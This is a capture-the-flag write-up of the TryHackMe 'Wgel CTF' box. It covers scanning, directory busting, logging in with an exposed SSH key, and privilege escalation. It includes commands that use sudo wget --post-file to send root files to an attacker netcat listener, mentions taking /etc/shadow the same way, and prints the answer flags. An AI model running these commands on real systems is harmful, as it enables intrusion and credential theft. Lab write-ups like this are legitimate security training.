# Write Up for Try_Hack_Me box - [Wgel CTF](https://tryhackme.com/room/wgelctf)

Add details

> Pratyush Prakhar (5#1NC#4N) - 11/14/2020


## Services Enumeration

1. Ran a normal scan with nmap. 

**Output**

```bash
$ nmap -vv -sC -sV -oN nmap/main 10.10.99.204
Nmap scan report for 10.10.99.204
Host is up, received syn-ack (0.21s latency).
Scanned at 2023-08-15 22:23:24 EDT for 35s
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:96:1b:66:80:1b:76:48:68:2d:14:b5:9a:01:aa:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCpgV7/18RfM9BJUBOcZI/eIARrxAgEeD062pw9L24Ulo5LbBeuFIv7hfRWE/kWUWdqHf082nfWKImTAHVMCeJudQbKtL1SBJYwdNo6QCQyHkHXslVb9CV1Ck3wgcje8zLbrml7OYpwBlumLVo2StfonQUKjfsKHhR+idd3/P5V3abActQLU8zB0a4m3TbsrZ9Hhs/QIjgsEdPsQEjCzvPHhTQCEywIpd/GGDXqfNPB0Yl/dQghTALyvf71EtmaX/fsPYTiCGDQAOYy3RvOitHQCf4XVvqEsgzLnUbqISGugF8ajO5iiY2GiZUUWVn4MVV1jVhfQ0kC3ybNrQvaVcXd
|   256 18:f7:10:cc:5f:40:f6:cf:92:f8:69:16:e2:48:f4:38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDCxodQaK+2npyk3RZ1Z6S88i6lZp2kVWS6/f955mcgkYRrV1IMAVQ+jRd5sOKvoK8rflUPajKc9vY5Yhk2mPj8=
|   256 b9:0b:97:2e:45:9b:f3:2a:4b:11:c7:83:10:33:e0:ce (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJhXt+ZEjzJRbb2rVnXOzdp5kDKb11LfddnkcyURkYke
80/tcp open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS GET HEAD
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
```

2. Services found open:
   1. *Port 22* - SSH - **OpenSSH 7.2p2**
   2. *Port 80* - HTTP - **Apache httpd 2.4.18**

3. Let's try to actively enumerate the path to gain more information.

## Web Reconnaissance

1. We go and check out the website hosted at the port 80.

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Wgel%20CTF/images/port_80.png)

2. Let's look out for the low hanging fruits.
    1. Page Source - we get a important note to a potential user - `jessie`.
    2. robots.txt
    3. Inspector

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Wgel%20CTF/images/page_source.png)

3. Let's start digging into the other resources that might be shared on the server. Let's go do some directory busting using a brand new tool - `feroxbuster`.

```bash
$ feroxbuster -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x html,js,sh -o port_80.txt -u http://10.10.99.204
```
\
![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Wgel%20CTF/web/port_80.bash)
\

4. We find that there is a `server misconfiguration` in place allowing us to read a `ssh key` from the subdomain at `/sitemap/.ssh/id_rsa`. The key can be seen [here](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Wgel%20CTF/web/sitemap/%2Essh/id_rsa)

![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Wgel%20CTF/images/sitemap.png)
\
![](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Wgel%20CTF/images/ssh.png)
\

5. We can use this private key to get a initial hold on the box for jessie.

## SSH

1. SSHing into the box with jessie's RSA private key.

```bash
jessie@CorpOne:~$ whoami
jessie
jessie@CorpOne:~$ cd Documents/
jessie@CorpOne:~/Documents$ ls -la
total 12
drwxr-xr-x  2 jessie jessie 4096 oct 26  2019 .
drwxr-xr-x 17 jessie jessie 4096 oct 26  2019 ..
-rw-rw-r--  1 jessie jessie   33 oct 26  2019 user_flag.txt
jessie@CorpOne:~/Documents$ cat user_flag.txt 
************************************
jessie@CorpOne:~/Documents$ sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```

2. We find the user's flag in the `/Document` directory. Enumeration is good. 

3. Let's explore for a path of Privilege Escalation. We find through `sudo -l` that the `wget` binary can be run as root without the passwd.

4. Looking for our friend [GTFObin](https://gtfobins.github.io/gtfobins/wget/). We will use the sudo escalation path first. Din't pan out.

```bash
jessie@CorpOne:~/Documents$ TF=$(mktemp)
jessie@CorpOne:~/Documents$ chmod +x $TF
jessie@CorpOne:~/Documents$ which bash
/bin/bash
jessie@CorpOne:~/Documents$ echo -e '#!/bin/sh\n/bin/bash 1>&0' >$TF
jessie@CorpOne:~/Documents$ echo $TF
/tmp/tmp.RvLb5xaiUo
jessie@CorpOne:~/Documents$ sudo /usr/bin/wget --use-askpass=$TF 0
/usr/bin/wget: unrecognized option '--use-askpass=/tmp/tmp.RvLb5xaiUo'
Usage: wget [OPTION]... [URL]...

Try `wget --help' for more options.
```

## PrivEsc

1. We find that the `file upload` functionality can allow us to send files over to our system. 
    1. Open up a netcat lister on our system to receive the file.
    2. Now we can send over the root files (flag, id_rsa keys) using the sudo permissions on the wget.

**Output**
```bash
jessie@CorpOne:~/Documents$ sudo /usr/bin/wget --post-file=/root/root_flag.txt http://10.13.5.5:1337/
--2023-08-16 06:00:16--  http://10.13.5.5:1337/
Connecting to 10.13.5.5:1337... connected.
HTTP request sent, awaiting response... 
No data received.
```
\
```bash
┌──(kali㉿kali)-[~/…/Try_Hack_Me/Wgel CTF/ssh/root]
└─$ nc -lnvvp 1337 > root.txt
listening on [any] 1337 ...
connect to [10.13.5.5] from (UNKNOWN) [10.10.99.204] 47542
^C sent 0, rcvd 244
                                                                                 
┌──(kali㉿kali)-[~/…/Try_Hack_Me/Wgel CTF/ssh/root]
└─$ ls
root.txt
                                                                                 
┌──(kali㉿kali)-[~/…/Try_Hack_Me/Wgel CTF/ssh/root]
└─$ cat root.txt          
POST / HTTP/1.1
User-Agent: Wget/1.17.1 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Host: 10.13.5.5:1337
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

*********************************************
```

2. Use this to get additional files off the system.
    1. */etc/passwd* - [here](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Wgel%20CTF/ssh/etc/passwd)
    2. */etc/shadow* - [here](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Wgel%20CTF/ssh/etc/shadow)
    3. *linpeas* - [here](https://github.com/pratty010/Boxes/blob/master/Try_Hack_Me/Wgel%20CTF/ssh/linpeas.out)


## Answers to resolve the box

1. User Flag - **057c67131c3d5e42dd5cd3075b198ff6**

2. Root flag - **b1b968b37519ad1daa6408188649263d**



**Stay Tuned On**\
[Github](https://github.com/pratty010/Boxes)\
[LinkedIn](https://www.linkedin.com/in/pratyush-prakhar/)